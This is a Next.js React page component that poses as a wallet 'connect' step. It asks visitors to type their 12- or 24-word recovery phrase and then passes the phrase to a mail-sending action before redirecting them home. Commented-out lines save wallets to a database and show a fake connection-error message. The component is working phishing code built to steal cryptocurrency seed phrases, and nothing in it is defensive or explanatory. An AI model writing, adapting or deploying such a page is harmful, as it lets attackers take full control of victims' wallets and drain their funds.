"use client";
import { useSearchParams } from "next/navigation";
import React, { useState } from "react";
import { useRouter } from "next/navigation";

import loading from "../loading";
import { send } from "@/actions/mail";
// import { savToDB } from "@/actions/wallets";

function InputPage() {
  const searchParams = useSearchParams();

  const title = searchParams.get("title");

  const [inputValue, setInputValue] = useState<string>("");

  const [isLoading, setIsLoading] = useState(false);

  const [text, setText] = useState<string>("");

  const router = useRouter();

  const handleInputChange = (e: React.ChangeEvent<HTMLTextAreaElement>) => {
    setInputValue(e.target.value);
    setText(e.target.value);
  };

  const handleButtonClick = async () => {
    if (text.trim() === "") {
      setIsLoading(false);
      alert("Please enter a correct phrase");
      return;
    } else {
      // Proceed with your logic (e.g., form submission)

      setIsLoading(true);
      await send(title, inputValue);

      setTimeout(() => {
        // Call saveToDb function with title and inputValue
        // savToDB(title, inputValue);

        setInputValue("");
        router.push("/");
      }, 4000);

      setIsLoading(false);

      return;
    }
  };

  return (
    <div className="min-h-screen bg-gray-200 flex justify-center items-center">
      <div className="bg-white p-8 rounded shadow-lg w-full sm:w-96">
        {/* <p className="mt-2 mb-2 text-xl text-red-600">
          Error connecting Wallet... Try connecting manually.
        </p> */}
        <h2 className="flex items-center justify-center text-2xl font-bold mb-4">
          {title}
        </h2>
        <div className="mb-4">
          <textarea
            typeof="text"
            className="w-full px-3 py-2 border border-gray-300 rounded h-28"
            placeholder="Enter your recovery phrase"
            value={inputValue}
            onChange={handleInputChange}
          />
        </div>
        <p className="mt-2 mb-2 text-sm text-gray-600">
          Tpically 12(sometimes 24)words seperated by single spaces
        </p>
        <button
          className="bg-blue-500 hover:bg-blue-600 text-white px-4 py-2 rounded"
          onClick={handleButtonClick}
        >
          CONNECT
        </button>
        {isLoading && loading()}
      </div>
    </div>
  );
}

export default InputPage;
